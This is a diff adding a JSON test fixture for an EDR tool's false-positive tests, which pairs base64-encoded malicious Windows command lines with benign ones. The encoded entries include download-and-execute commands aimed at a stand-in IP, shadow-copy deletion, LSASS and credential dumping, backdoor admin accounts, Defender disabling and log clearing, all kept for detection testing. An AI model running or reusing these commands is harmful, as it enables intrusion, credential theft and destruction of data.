@@ -1,0 +1,289 @@
+{
+ "_about": "Command lines for tests\\03-FalsePositive.Tests.ps1. malicious[].cmd is base64 (UTF-8) so this file does not look like an attack script to antivirus.",
+ "malicious": [
+  {
+   "expect": "Encoded PowerShell command",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1lbmMgU1FCRkFGZ0FJQUFvQUU0QVpRQjNBQzBBVHdCaUFHb0FaUUJqQUhRQUtRQT0=",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "expect": "Encoded PowerShell command",
+   "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+   "cmd": "cHdzaC5leGUgLU5vUHJvZmlsZSAtRW5jb2RlZENvbW1hbmQgU1FCRkFGZ0E=",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "expect": "PowerShell download or in-memory execution",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1jICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8yMDMuMC4xMTMuNS9hLnBzMScpIg==",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "PowerShell download or in-memory execution",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1jICJpd3IgaHR0cDovLzIwMy4wLjExMy41L2EgfCBpZXgi",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Shadow copy or recovery tampering",
+   "image": "C:\\Windows\\System32\\vssadmin.exe",
+   "cmd": "dnNzYWRtaW4uZXhlIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Shadow copy or recovery tampering",
+   "image": "C:\\Windows\\System32\\bcdedit.exe",
+   "cmd": "YmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgbm8=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Credential dumping tool",
+   "image": "C:\\Users\\Public\\m.exe",
+   "cmd": "bS5leGUgInByaXZpbGVnZTo6ZGVidWciICJzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMiIGV4aXQ=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "LSASS memory dump",
+   "image": "C:\\Windows\\System32\\rundll32.exe",
+   "cmd": "cnVuZGxsMzIuZXhlIEM6XFdpbmRvd3NcU3lzdGVtMzJcY29tc3Zjcy5kbGwsIE1pbmlEdW1wIDYyNCBDOlx0ZW1wXGxzYXNzLmRtcCBmdWxs",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "LSASS memory dump",
+   "image": "C:\\Tools\\procdump64.exe",
+   "cmd": "cHJvY2R1bXA2NC5leGUgLWFjY2VwdGV1bGEgLW1hIGxzYXNzLmV4ZSBvdXQuZG1w",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "mshta script execution",
+   "image": "C:\\Windows\\System32\\mshta.exe",
+   "cmd": "bXNodGEuZXhlIGh0dHA6Ly8yMDMuMC4xMTMuNS9hLmh0YQ==",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "certutil download or decode",
+   "image": "C:\\Windows\\System32\\certutil.exe",
+   "cmd": "Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzIwMy4wLjExMy41L2EuZXhlIGEuZXhl",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "regsvr32/rundll32 script abuse",
+   "image": "C:\\Windows\\System32\\regsvr32.exe",
+   "cmd": "cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovLzIwMy4wLjExMy41L2Euc2N0IHNjcm9iai5kbGw=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "bitsadmin download",
+   "image": "C:\\Windows\\System32\\bitsadmin.exe",
+   "cmd": "Yml0c2FkbWluIC90cmFuc2ZlciBqb2IgaHR0cDovLzIwMy4wLjExMy41L2EuZXhlIEM6XGEuZXhl",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Office app started a shell",
+   "image": "C:\\Windows\\System32\\cmd.exe",
+   "cmd": "Y21kLmV4ZSAvYyB3aG9hbWk=",
+   "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  },
+  {
+   "expect": "Script run from Downloads or Temp",
+   "image": "C:\\Windows\\System32\\wscript.exe",
+   "cmd": "d3NjcmlwdC5leGUgQzpcVXNlcnNcdVxEb3dubG9hZHNcaW52b2ljZS5qcw==",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "expect": "New user or admin group change",
+   "image": "C:\\Windows\\System32\\net.exe",
+   "cmd": "bmV0IHVzZXIgL2FkZCBoYWNrZXIgUGFzc3cwcmQh",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "New user or admin group change",
+   "image": "C:\\Windows\\System32\\net.exe",
+   "cmd": "bmV0IHVzZXIgaGFja2VyIFBhc3N3MHJkISAvYWRk",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "New user or admin group change",
+   "image": "C:\\Windows\\System32\\net.exe",
+   "cmd": "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgaGFja2VyIC9hZGQ=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Defender tampering",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Event log cleared",
+   "image": "C:\\Windows\\System32\\wevtutil.exe",
+   "cmd": "d2V2dHV0aWwgY2wgU2VjdXJpdHk=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Scheduled task created from command line",
+   "image": "C:\\Windows\\System32\\schtasks.exe",
+   "cmd": "c2NodGFza3MgL2NyZWF0ZSAvdG4gdXBkIC90ciBDOlxVc2Vyc1xQdWJsaWNcYS5leGUgL3NjIG9ubG9nb24=",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "expect": "Executable launched from Downloads",
+   "image": "C:\\Users\\u\\Downloads\\setup.exe",
+   "cmd": "IkM6XFVzZXJzXHVcRG93bmxvYWRzXHNldHVwLmV4ZSI=",
+   "parent": "C:\\Windows\\explorer.exe"
+  }
+ ],
+ "benign": [
+  {
+   "name": "git status",
+   "image": "C:\\Program Files\\Git\\cmd\\git.exe",
+   "cmd": "git.exe status",
+   "parent": "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+  },
+  {
+   "name": "npm install",
+   "image": "C:\\Program Files\\nodejs\\node.exe",
+   "cmd": "node.exe npm-cli.js install",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "PowerShell script with -ExecutionPolicy",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\scripts\\build.ps1",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "pwsh -Command",
+   "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+   "cmd": "pwsh.exe -NoLogo -Command Get-ChildItem",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "name": "PowerShell pipeline",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy RemoteSigned -Command \"Get-Process | Sort-Object CPU\"",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "PowerShell -Command with the word Download",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Write-Output 'Download complete'\"",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "PowerShell Invoke-WebRequest to a file",
+   "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+   "cmd": "pwsh.exe -Command \"Invoke-WebRequest https://api.github.com -OutFile x.json\"",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "dev tool 'rg -e' under pwsh",
+   "image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+   "cmd": "pwsh.exe -NoProfile -Command \"rg -e TODO src\"",
+   "parent": "C:\\Users\\u\\.local\\bin\\claude.exe"
+  },
+  {
+   "name": "git commit message mentioning -e under PowerShell",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"git commit -m 'support -e flag'\"",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "VS Code",
+   "image": "C:\\Users\\u\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+   "cmd": "Code.exe --enable-features=x",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "name": "dotnet build",
+   "image": "C:\\Windows\\System32\\cmd.exe",
+   "cmd": "cmd.exe /c dotnet build -c Release",
+   "parent": "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+  },
+  {
+   "name": "msiexec from Temp",
+   "image": "C:\\Windows\\System32\\msiexec.exe",
+   "cmd": "msiexec.exe /i C:\\Users\\u\\AppData\\Local\\Temp\\pkg.msi",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "name": "list local admins (read only)",
+   "image": "C:\\Windows\\System32\\net.exe",
+   "cmd": "net localgroup administrators",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "list users",
+   "image": "C:\\Windows\\System32\\net.exe",
+   "cmd": "net user",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "schtasks query",
+   "image": "C:\\Windows\\System32\\schtasks.exe",
+   "cmd": "schtasks /query /fo LIST",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "certutil hash",
+   "image": "C:\\Windows\\System32\\certutil.exe",
+   "cmd": "certutil -hashfile file.zip SHA256",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "rundll32 control panel",
+   "image": "C:\\Windows\\System32\\rundll32.exe",
+   "cmd": "rundll32.exe shell32.dll,Control_RunDLL",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "name": "winget upgrade",
+   "image": "C:\\Users\\u\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe",
+   "cmd": "winget upgrade --all",
+   "parent": "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+  },
+  {
+   "name": "OneDrive",
+   "image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
+   "cmd": "OneDrive.exe /background",
+   "parent": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "name": "Excel printing",
+   "image": "C:\\Windows\\System32\\splwow64.exe",
+   "cmd": "splwow64.exe 8192",
+   "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+  },
+  {
+   "name": "wevtutil query",
+   "image": "C:\\Windows\\System32\\wevtutil.exe",
+   "cmd": "wevtutil qe Security /c:5",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "Get-MpPreference read",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Get-MpPreference",
+   "parent": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+   "name": "Fortnite (built-in exclusion)",
+   "image": "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe",
+   "cmd": "FortniteClient-Win64-Shipping.exe -enc ",
+   "parent": "C:\\Program Files (x86)\\Epic Games\\Launcher\\Portal\\Binaries\\Win64\\EpicGamesLauncher.exe"
+  },
+  {
+   "name": "FreeEDR engine start",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"C:\\Program Files\\FreeEDR\\EDR-Engine.ps1\"",
+   "parent": "C:\\Windows\\System32\\svchost.exe"
+  },
+  {
+   "name": "FreeEDR tray start",
+   "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy Bypass -STA -WindowStyle Hidden -File \"C:\\Program Files\\FreeEDR\\EDR-Tray.ps1\"",
+   "parent": "C:\\Windows\\explorer.exe"
+  }
+ ]
+}
